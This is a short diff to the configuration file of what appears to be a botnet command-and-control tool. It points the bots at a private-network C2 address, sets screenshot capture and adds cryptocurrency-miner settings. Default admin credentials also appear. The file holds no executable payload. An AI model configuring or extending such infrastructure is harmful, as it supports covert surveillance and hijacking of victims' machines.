@@ -3,10 +3,14 @@ username: "admin"
 password: "erratic"
 
 # the url of the https c2 server, used by bots
-url: "https://127.0.0.1"
+url: "http://10.0.1.183:8004"
 
 # port that the c2 server runs on, not used by bots
 port: 8004
 
 # screenshot resolution for bots
 resolution: 720
+
+# miner settings
+miner_wallet: ""
+miner_intensity: 50
